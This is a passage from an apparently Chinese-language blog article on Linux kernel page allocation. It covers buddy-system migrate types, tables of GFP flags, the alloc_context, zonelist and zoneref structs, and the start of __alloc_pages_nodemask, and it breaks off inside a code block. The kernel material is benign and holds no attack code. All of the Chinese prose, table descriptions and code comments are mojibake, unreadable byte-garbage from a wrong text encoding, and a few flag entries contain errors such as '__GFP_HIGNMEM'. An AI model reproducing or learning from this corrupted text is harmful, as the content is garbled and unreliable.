é¡µå¸§ç¼“å­˜ï¼Œå…¶è¿ç§»<strong>ä»…é™äºåŒä¸€èŠ‚ç‚¹å†…</strong></li><li><strong>MIGRATE_CMA</strong>ï¼š<code>Contiguous Memory Allocator</code>ï¼Œå³<strong>è¿ç»­çš„ç‰©ç†å†…å­˜</strong></li><li><strong>MIGRATE_ISOLATE</strong>ï¼š<strong>ä¸èƒ½ä»è¯¥é“¾è¡¨åˆ†é…é¡µé¢</strong>ï¼Œè¯¥é“¾è¡¨ç”¨äºè·¨ NUMA èŠ‚ç‚¹è¿›è¡Œé¡µé¢ç§»åŠ¨ï¼Œå°†é¡µé¢ç§»åŠ¨åˆ°ä½¿ç”¨è¯¥é¡µé¢æœ€ä¸ºé¢‘ç¹çš„ CPU æ‰€å¤„èŠ‚ç‚¹</li><li><em>MIGRATE_TYPES_ï¼šè¡¨ç¤ºè¿ç§»ç±»å‹çš„æ•°ç›®ï¼Œ_å¹¶ä¸å­˜åœ¨è¿™ä¸€é“¾è¡¨</em></li></ul><p>ä»¥ <em>free_list[0]</em> ä½œä¸ºä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ overviewï¼š</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><h3 id="nr-freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°"><a href="#nr-freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°" class="headerlink" title="nr_freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°"></a>nr_freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°</h3><p>è¯¥å­—æ®µè®°å½•äº†åœ¨å½“å‰ free_area ä¸­çš„ç©ºé—²é¡µé¢å—çš„æ•°é‡ï¼Œå¯¹äº free_area[0] ä»¥å¤–çš„ free_area è€Œè¨€å…¶å•ä½å¹¶éæ˜¯å•ä¸ªé¡µæ¡†ï¼Œè€Œæ˜¯ä»¥_å†…å­˜å—_ä¸ºå•ä½</p><h1 id="0x02-é¡µçš„åˆ†é…"><a href="#0x02-é¡µçš„åˆ†é…" class="headerlink" title="0x02.é¡µçš„åˆ†é…"></a>0x02.é¡µçš„åˆ†é…</h1><p>buddy system æä¾›äº†ä¸€ç»„ç”¨ä»¥è¿›è¡Œé¡µé¢åˆ†é…çš„æ¥å£ï¼Œæ¥ä¸‹æ¥ç¬”è€…å°†ä»¥è‡ªåº•å‘ä¸Šçš„æ–¹å¼è¿›è¡Œæºç åˆ†æ</p><h2 id="ä¸€ã€GFPï¼ˆget-free-pageï¼‰æ ‡å¿—ä½"><a href="#ä¸€ã€GFPï¼ˆget-free-pageï¼‰æ ‡å¿—ä½" class="headerlink" title="ä¸€ã€GFPï¼ˆget free pageï¼‰æ ‡å¿—ä½"></a>ä¸€ã€GFPï¼ˆget free pageï¼‰æ ‡å¿—ä½</h2><blockquote><p>GFPæ ‡å¿—ä½è¿™ä¸€èŠ‚åŸºæœ¬ä¸Šæ¬è¿è‡ª<a href="https://blog.csdn.net/yhb1047818384/article/details/112298996">è¿™ç¯‡æ–‡ç« </a></p></blockquote><p>åœ¨ kernel memory allocation ä¸­æˆ‘ä»¬ç»å¸¸èƒ½è§åˆ° <code>gfp_t</code> ç±»å‹ï¼Œå…¶è¡¨ç¤ºåˆ†é…æ—¶çš„æ ‡å¿—ä½ï¼Œå®šä¹‰åœ¨ <code>include/linux/gfp.h</code> ä¸­ï¼Œå¤§æ¦‚æœ‰å¦‚ä¸‹è¿™äº›å¯ç”¨æ ‡å¿—ä½ï¼š</p><ul><li><strong>å†…å­˜ç®¡ç†åŒºä¿®é¥°ç¬¦ (zone modifiers)</strong></li></ul><p>å†…å­˜ç®¡ç†åŒºä¿®é¥°ç¬¦ä¸»è¦æè¿°ä»å“ªäº›å†…å­˜ç®¡ç†åŒºæ¥åˆ†é…å†…å­˜</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_DMA</td><td align="left">ä»ZONE_DMAåŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td align="left">__GFP_HIGNMEM</td><td align="left">ä»ZONE_HIGHMEMåŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td align="left">__GFP_DMA32</td><td align="left">ä»ZONE_DMA32åŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td align="left">__GFP_MOVABLE</td><td align="left">å†…å­˜è§„æ•´æ—¶å¯ä»¥è¿ç§»æˆ–å›æ”¶é¡µé¢</td></tr></tbody></table><ul><li><strong>ç§»åŠ¨å’Œæ›¿æ¢ä¿®é¥°ç¬¦(mobility and placement modifiers)</strong></li></ul><p>ç§»åŠ¨å’Œæ›¿æ¢ä¿®é¥°ç¬¦ä¸»è¦è¡¨ç¤ºåˆ†é…å‡ºæ¥çš„é¡µé¢å…·æœ‰çš„è¿ç§»å±æ€§</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_RECLAIMABLE</td><td align="left">åˆ†é…çš„å†…å­˜é¡µé¢å¯ä»¥å›æ”¶</td></tr><tr><td align="left">__GFP_WRITE</td><td align="left">ç”³è¯·çš„é¡µé¢ä¼šè¢«å¼„æˆè„é¡µ</td></tr><tr><td align="left">__GFP_HARDWALL</td><td align="left">å¼ºåˆ¶ä½¿ç”¨cpusetå†…å­˜åˆ†é…ç­–ç•¥</td></tr><tr><td align="left">__GFP_THISNODE</td><td align="left">åœ¨æŒ‡å®šçš„èŠ‚ç‚¹ä¸Šåˆ†é…å†…å­˜</td></tr><tr><td align="left">__GFP_ACCOUNT</td><td align="left">kmemcgä¼šè®°å½•åˆ†é…è¿‡ç¨‹</td></tr></tbody></table><ul><li><strong>æ°´ä½ä¿®é¥°ç¬¦ ï¼ˆwatermark modifiersï¼‰</strong></li></ul><p>ä¸æ°´ä½çº¿ç›¸å…³çš„æ ‡å¿—ä½</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_ATOMIC</td><td align="left">é«˜ä¼˜å…ˆçº§åˆ†é…å†…å­˜ï¼Œåˆ†é…å™¨å¯ä»¥åˆ†é…æœ€ä½è­¦æˆ’æ°´ä½çº¿ä¸‹çš„é¢„ç•™å†…å­˜</td></tr><tr><td align="left">__GFP_HIGH</td><td align="left">åˆ†é…å†…å­˜çš„è¿‡ç¨‹ä¸­ä¸å¯ä»¥ç¡çœ æˆ–æ‰§è¡Œé¡µé¢å›æ”¶åŠ¨ä½œ</td></tr><tr><td align="left">__GFP_MEMALLOC</td><td align="left">å…è®¸è®¿é—®æ‰€æœ‰çš„å†…å­˜</td></tr><tr><td align="left">__GFP_NOMEMALLOC</td><td align="left">ä¸å…è®¸è®¿é—®æœ€ä½è­¦æˆ’æ°´ä½çº¿ä¸‹çš„ç³»ç»Ÿé¢„ç•™å†…å­˜</td></tr></tbody></table><ul><li><strong>é¡µé¢å›æ”¶ä¿®é¥°ç¬¦ï¼ˆreclaim modifiers)</strong></li></ul><p>ä¸é¡µé¢å›æ”¶ç›¸å…³çš„æ ‡å¿—ä½</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_IO</td><td align="left">å¯åŠ¨ç‰©ç†I&#x2F;Oä¼ è¾“</td></tr><tr><td align="left">__GFP_FS</td><td align="left">å…è®¸è°ƒç”¨åº•å±‚FSæ–‡ä»¶ç³»ç»Ÿã€‚å¯é¿å…åˆ†é…å™¨é€’å½’åˆ°å¯èƒ½å·²ç»æŒæœ‰é”çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œ é¿å…æ­»é”</td></tr><tr><td align="left">__GFP_DIRECT_RECLAIM</td><td align="left">åˆ†é…å†…å­˜è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨ç›´æ¥å†…å­˜å›æ”¶</td></tr><tr><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">å†…å­˜åˆ°è¾¾ä½æ°´ä½æ—¶å”¤é†’kswapdçº¿ç¨‹å¼‚æ­¥å›æ”¶å†…å­˜</td></tr><tr><td align="left">__GFP_RECLAIM</td><td align="left">è¡¨ç¤ºæ˜¯å¦å¯ä»¥ç›´æ¥å†…å­˜å›æ”¶æˆ–è€…ä½¿ç”¨kswapdçº¿ç¨‹è¿›è¡Œå›æ”¶</td></tr><tr><td align="left">__GFP_RETRY_MAYFAIL</td><td align="left">åˆ†é…å†…å­˜å¯ä»¥å¯èƒ½ä¼šå¤±è´¥ï¼Œä½†æ˜¯åœ¨ç”³è¯·è¿‡ç¨‹ä¸­ä¼šå›æ”¶ä¸€äº›ä¸å¿…è¦çš„å†…å­˜ï¼Œæ˜¯æ•´ä¸ªç³»ç»Ÿå—ç›Š</td></tr><tr><td align="left">__GFP_NOFAIL</td><td align="left">å†…å­˜åˆ†é…å¤±è´¥åæ— é™åˆ¶çš„é‡å¤å°è¯•ï¼ŒçŸ¥é“åˆ†é…æˆåŠŸ</td></tr><tr><td align="left">__GFP_NORETRY</td><td align="left">ç›´æ¥é¡µé¢å›æ”¶æˆ–è€…å†…å­˜è§„æ•´åè¿˜æ˜¯æ— æ³•åˆ†é…å†…å­˜æ—¶ï¼Œä¸å¯ç”¨retryåå¤å°è¯•åˆ†é…å†…å­˜ï¼Œç›´æ¥è¿”å›NULL</td></tr></tbody></table><ul><li><strong>è¡Œä¸ºä¿®é¥°ç¬¦ (action modifiers)</strong></li></ul><p>ä¸åˆ†é…æ—¶çš„è¡Œä¸ºç›¸å…³çš„æ ‡å¿—ä½</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_NOWARN</td><td align="left">å…³é—­å†…å­˜åˆ†é…è¿‡ç¨‹ä¸­çš„WARNING</td></tr><tr><td align="left">__GFP_COMP</td><td align="left">åˆ†é…çš„å†…å­˜é¡µé¢å°†è¢«ç»„åˆæˆå¤åˆé¡µcompound page</td></tr><tr><td align="left">__GFP_ZERO</td><td align="left">è¿”å›ä¸€ä¸ªå…¨éƒ¨å¡«å……ä¸º0çš„é¡µé¢</td></tr></tbody></table><ul><li><strong>ç»„åˆç±»å‹æ ‡å¿—(Useful GFP flag combinations)</strong></li></ul><p>å‰é¢æè¿°çš„ä¿®é¥°ç¬¦ç§è¿‡äºç¹å¤šï¼Œå› æ­¤linuxå®šä¹‰äº†ä¸€äº›ç»„åˆçš„ç±»å‹æ ‡å¿—ï¼Œä¾›å¼€å‘è€…ä½¿ç”¨ã€‚</p><table><thead><tr><th align="left">flag</th><th align="left">element</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">GFP_ATOMIC</td><td align="left">__GFP_HIGH |__GFP_ATOMIC |__GFP_KSWAPD_RECLAIM</td><td align="left">åˆ†é…è¿‡ç¨‹ä¸èƒ½ä¼‘çœ ï¼Œåˆ†é…å…·æœ‰é«˜ä¼˜å…ˆçº§ï¼Œå¯ä»¥è®¿é—®ç³»ç»Ÿé¢„ç•™å†…å­˜</td></tr><tr><td align="left">GFP_KERNEL</td><td align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS</td><td align="left">åˆ†é…å†…å­˜æ—¶å¯ä»¥è¢«é˜»å¡(å³ä¼‘çœ )</td></tr><tr><td align="left">GFP_KERNEL_ACCOUNT</td><td align="left">GFP_KERNEL |__GFP_ACCOUNT</td><td align="left">å’ŒGFP_KERNELä½œç”¨ä¸€æ ·ï¼Œä½†æ˜¯åˆ†é…çš„è¿‡ç¨‹ä¼šè¢«kmemcgè®°å½•</td></tr><tr><td align="left">GFP_NOWAIT</td><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">åˆ†é…è¿‡ç¨‹ä¸­ä¸å…è®¸å› ç›´æ¥å†…å­˜å›æ”¶è€Œå¯¼è‡´åœé¡¿</td></tr><tr><td align="left">GFP_NOIO</td><td align="left">__GFP_RECLAIM</td><td align="left">ä¸éœ€è¦å¯åŠ¨ä»»ä½•çš„I&#x2F;Oæ“ä½œ</td></tr><tr><td align="left">GFP_NOFS</td><td align="left">__GFP_RECLAIM |__GFP_IO</td><td align="left">ä¸ä¼šæœ‰è®¿é—®ä»»ä½•æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œ</td></tr><tr><td align="left">GFP_USER</td><td align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS |__GFP_HARDWALL</td><td align="left">ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹åˆ†é…å†…å­˜</td></tr><tr><td align="left">GFP_DMA</td><td align="left">__GFP_DMA</td><td align="left">ä»ZONE_DMAåŒºåˆ†é…å†…å­˜</td></tr><tr><td align="left">GFP_DMA32</td><td align="left">__GFP_DMA32</td><td align="left">ä»ZONE_DMA32åŒºåˆ†é…å†…å­˜</td></tr><tr><td align="left">GFP_HIGHUSER</td><td align="left">GFP_USER | __GFP_HIGHMEM</td><td align="left">ç”¨æˆ·è¿›ç¨‹åˆ†é…å†…å­˜ï¼Œä¼˜å…ˆä½¿ç”¨ZONE_HIGHMEMï¼Œ ä¸”è¿™äº›é¡µé¢ä¸å…è®¸è¿ç§»</td></tr><tr><td align="left">GFP_HIGHUSER_MOVABLE</td><td align="left">GFP_HIGHUSER | __GFP_MOVABLE</td><td align="left">å’ŒGFP_HIGHUSERç±»ä¼¼ï¼Œä½†æ˜¯é¡µé¢å¯ä»¥è¿ç§»</td></tr><tr><td align="left">GFP_TRANSHUGE_LIGHT</td><td align="left">GFP_HIGHUSER_MOVABLE | __GFP_COMP | __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM</td><td align="left">é€æ˜å¤§é¡µçš„å†…å­˜åˆ†é…ï¼Œ lightè¡¨ç¤ºä¸è¿›è¡Œå†…å­˜å‹ç¼©å’Œå›æ”¶</td></tr><tr><td align="left">GFP_TRANSHUGE</td><td align="left">GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM</td><td align="left">å’ŒGFP_TRANSHUGE_LIGHTç±»ä¼¼ï¼Œé€šå¸¸khugepagedä½¿ç”¨è¯¥æ ‡å¿—</td></tr></tbody></table><h2 id="äºŒã€alloc-context-ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡"><a href="#äºŒã€alloc-context-ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡" class="headerlink" title="äºŒã€alloc_context ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡"></a>äºŒã€alloc_context ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡</h2><p>è¿™æ˜¯ä¸€ä¸ªåˆ†é…è¿‡ç¨‹ä¸­éå¸¸é‡è¦çš„ç»“æ„ä½“ï¼Œç”¨æ¥è¡¨ç¤ºæˆ‘ä»¬å•æ¬¡å†…å­˜åˆ†é…çš„ä¸Šä¸‹æ–‡ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç”¨ä»¥ä¿å­˜åœ¨åˆ†é…æ—¶æ¶‰åŠåˆ°çš„å‡½æ•°é—´ä¼ é€’çš„</span><br><span class="hljs-comment"> * ç»å¤§éƒ¨åˆ†çš„ä¸å¯å˜çš„åˆ†é…å‚æ•°çš„ç»“æ„ä½“ï¼Œ</span><br><span class="hljs-comment"> * åŒ…æ‹¬ alloc_pages å‡½æ•°æ—</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * nodemask, migratetype ä¸ highest_zoneidx ä»…åœ¨</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() ä¸­è¢«åˆå§‹åŒ–ä¸€æ¬¡ï¼Œä¹‹åä¸å†æ”¹å˜.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist, preferred_zone ä¸ highest_zoneidx æœ€åˆåœ¨</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() ä¸­ä¸ºå¿«é€Ÿè·¯å¾„è®¾ç½®, ä¹‹åå¯èƒ½ä¼šåœ¨</span><br><span class="hljs-comment"> * __alloc_pages_slowpath() ä¸­è¢«æ”¹å˜. å…¶ä»–æ‰€æœ‰çš„å‡½æ•°é€šè¿‡</span><br><span class="hljs-comment"> * å¸¸é‡æŒ‡é’ˆä¼ é€’è¯¥ç»“æ„ä½“ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> *<span class="hljs-title">zonelist</span>;</span><br><span class="hljs-type">nodemask_t</span> *nodemask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">preferred_zoneref</span>;</span><br><span class="hljs-type">int</span> migratetype;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * highest_zoneidx è¡¨ç¤ºåˆ†é…è¯·æ±‚ä¸­æœ€é«˜çš„å¯ç”¨ zone çš„ä¸‹æ ‡ã€‚</span><br><span class="hljs-comment"> * ç”±äº zone çš„æ€§è´¨, ç›¸è¾ƒäº highest_zoneidxï¼Œ</span><br><span class="hljs-comment"> * åœ¨æ›´ä½çš„ zone ä¸Šçš„å†…å­˜ä¼šç”± lowmem_reserve[highest_zoneidx] ä¿æŠ¤ã€‚</span><br><span class="hljs-comment"> * è¯‘æ³¨ï¼šå°±æ˜¯æ°´ä½çº¿æœºåˆ¶ï¼Œä¸è®°å¾—çš„å›å»çœ‹ä¸Šä¸€ç¯‡æ–‡ç« </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * highest_zoneidx åŒæ ·è¢«å›æ”¶/å‹ç¼©ä½¿ç”¨ä»¥é™åˆ¶ç›®æ ‡ zoneï¼Œ</span><br><span class="hljs-comment"> * å› ä¸ºé«˜äºè¯¥ä¸‹æ ‡çš„ zone æ— æ³•ç”¨äºæ­¤åˆ†é…è¯·æ±‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">highest_zoneidx</span>;</span><br><span class="hljs-type">bool</span> spread_dirty_pages;<br>&#125;;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹æˆå‘˜ï¼š</p><ul><li>zonelist</li></ul><p>è¯¥æˆå‘˜è¡¨ç¤ºåœ¨<strong>è¿™ä¸€æ¬¡çš„åˆ†é…ä¸Šä¸‹æ–‡</strong>ä¸­ï¼Œæˆ‘ä»¬å°†è¦æ“ä½œçš„ zone çš„<strong>åˆ—è¡¨</strong>ï¼Œå…¶ä¸ºä¸€ä¸ª <code>zonelist</code> ç±»å‹çš„<strong>ç»“æ„ä½“æ•°ç»„</strong>ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å•æ¬¡åˆ†é…è¯·æ±‚åœ¨ä¸€ä¸ª zonelist ä¸Šæ“ä½œ. ä¸€ä¸ª zonelist ä¾¿æ˜¯ä¸€ç»„ zone çš„åˆ—è¡¨ï¼Œ</span><br><span class="hljs-comment"> * å…¶ä¸­ç¬¬ä¸€ä¸ª zone ä¸ºåˆ†é…çš„â€œç›®æ ‡â€ï¼Œè€Œå…¶ä»–çš„ zone ä¸ºåå¤‡çš„zoneï¼Œä¼˜å…ˆçº§é™ä½ã€‚</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¸ºäº†æé«˜ zonelist çš„è¯»å–é€Ÿåº¦, åœ¨ zonerefs ä¸­åŒ…å«æ­£åœ¨è¢«è¯»å–çš„ entry çš„ zone indexã€‚</span><br><span class="hljs-comment"> * ç”¨æ¥è®¿é—®æ‰€ç»™çš„ zoneref ç»“æ„ä½“ä¿¡æ¯çš„å¸®åŠ©å‡½æ•°æœ‰ï¼š</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist_zone()- è¿”å›ä¸€ä¸ª struct zone çš„æŒ‡é’ˆä½œä¸º _zonerefs ä¸­çš„ä¸€ä¸ª entry</span><br><span class="hljs-comment"> * zonelist_zone_idx()- è¿”å›ä½œä¸º entry çš„ zone çš„ index</span><br><span class="hljs-comment"> * zonelist_node_idx()- è¿”å›ä½œä¸º entry çš„ node çš„ index</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> _<span class="hljs-title">zonerefs</span>[<span class="hljs-title">MAX_ZONES_PER_ZONELIST</span> + 1];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶ä¸ºä¸€ä¸ª  <code>zoneref</code> ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼ŒåŒ…å«äº†ä¸€ä¸ª zone çš„æŒ‡é’ˆä»¥åŠä¸€ä¸ª indexï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è¯¥ç»“æ„åŒ…å«äº† zonelist ä¸­ä¸€ä¸ª zone çš„ä¿¡æ¯ã€‚ </span><br><span class="hljs-comment"> * å…¶è¢«å‚¨å­˜åœ¨è¿™é‡Œä»¥é¢„é˜²å¯¹å¤§ç»“æ„ä½“çš„è§£å¼•ç”¨ä¸å¯¹è¡¨çš„æŸ¥è¯¢ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><span class="hljs-comment">/* æŒ‡å‘å®é™…ä¸Šçš„ zone çš„æŒ‡é’ˆ */</span><br><span class="hljs-type">int</span> zone_idx;<span class="hljs-comment">/* zone_idx(zoneref-&gt;zone) */</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>preferred_zoneref</li></ul><p>è¯¥æˆå‘˜ä¸ºä¸€ä¸ª <code>zoneref</code> ç±»å‹çš„ç»“æ„ä½“ï¼Œè¡¨ç¤º<strong>ä¼˜å…ˆç”¨æ¥è¿›è¡Œåˆ†é…çš„ zone</strong></p><ul><li>spread_dirty_pages</li></ul><p>å¸ƒå°”å€¼ï¼Œè¡¨ç¤º<strong>æ­¤æ¬¡åˆ†é…æ˜¯å¦å¯èƒ½äº§ç”Ÿè„é¡µ</strong>ï¼ˆéœ€è¦è¿›è¡Œå†™å›ï¼‰ï¼Œé€šå¸¸åˆ†é…éœ€è¦å†™å…¥çš„é¡µä¼šå‡ºç°</p><h2 id="ä¸‰ã€-alloc-pages-nodemask-ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å›-page-ç»“æ„ä½“"><a href="#ä¸‰ã€-alloc-pages-nodemask-ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å›-page-ç»“æ„ä½“" class="headerlink" title="ä¸‰ã€__alloc_pages_nodemask()ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å› page ç»“æ„ä½“"></a>ä¸‰ã€__alloc_pages_nodemask()ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å› page ç»“æ„ä½“</h2><p>è¯¥å‡½æ•°æ˜¯ buddy system ä¸­ç”¨ä»¥è¿›è¡Œé¡µé¢åˆ†é…çš„<strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼Œæ‰€æœ‰çš„é¡µé¢åˆ†é… API éƒ½æ˜¯åŸºäºè¯¥å‡½æ•°çš„å°è£…ï¼Œå…¶éœ€è¦ä¼ å…¥çš„å››ä¸ªå‚æ•°ä¸ºï¼š</p><ul><li><code>gfp_mask</code>ï¼šåˆ†é…è¡Œä¸ºå‚æ•°ï¼ˆå¯ä»¥å‚è§ <a href="https://blog.csdn.net/choumin/article/details/109603011">è¿™é‡Œ</a>ï¼‰</li><li><code>order</code>ï¼šåˆ†é…çš„è¿ç»­ç‰©ç†é¡µæ¡†çš„é˜¶</li><li><code>preferred_nid</code> é€‰å–çš„èŠ‚ç‚¹çš„ id</li><li><code>nodemask</code>ï¼š</li></ul><p>è¿”å›å€¼ä¸ºåˆ†é…çš„<strong>è¿ç»­ç‰©ç†é¡µ</strong>ä¸­çš„ç¬¬ä¸€å¼ ç‰©ç†é¡µçš„ <code>page</code> ç»“æ„ä½“</p><blockquote><p>å¦‚æœä½ å·²ç»ä¸è®°å¾— page ç»“æ„ä½“ä¸ç‰©ç†é¡µçš„é¡µæ¡†å·é—´çš„è½¬æ¢å…¬å¼äº†ï¼Œå¯ä»¥å›å»çœ‹<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#%EF%BC%881%EF%BC%89page-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%B0-PFN%EF%BC%9Apage-%E7%BB%93%E6%9E%84%E4%BD%93%E5%9C%B0%E5%9D%80%E5%87%8F%E5%8E%BB%E5%AF%B9%E5%BA%94-mem-section-gt-section-mem-map">ä¸Šä¸€ç¯‡æ–‡ç« </a></p><p>å½“ç„¶ï¼Œç¬”è€…æ¯”è¾ƒå¥½å¿ƒï¼ˆç¬‘ï¼‰ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºè®¡ç®—å…¬å¼ï¼Œ<code>mem_section</code> ç»“æ„ä½“ä¸­çš„ <code>section_mem_map</code> æˆå‘˜å­˜å‚¨äº†å…¶èµ·å§‹åœ°å€å‡æ‰å…¶èµ·å§‹åœ°å€å¯¹åº”çš„ç‰©ç†é¡µæ¡†çš„é¡µæ¡†å·çš„å·®å€¼ï¼Œè¯¥æˆå‘˜ä¸ page ç»“æ„ä½“é—´åš<strong>æŒ‡é’ˆå·®å€¼è¿ç®—</strong>ä¾¿èƒ½è·å¾— page ç»“æ„ä½“å¯¹åº”çš„ç‰©ç†é¡µæ¡†å·ï¼š<br>$$<br>address_{struct\ page} - section_mem_map &#x3D; address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>&#x3D;(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>&#x3D;PFN<br>$$</p></blockquote><p>è¿™æ˜¯ä¸€å¼ _Overview_</p><p><img src="https://i.loli.net/2021/11/30/9srbaMvWeTSO1hc.png" alt="ä»çŸ¥ä¹å·çš„.png"></p><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 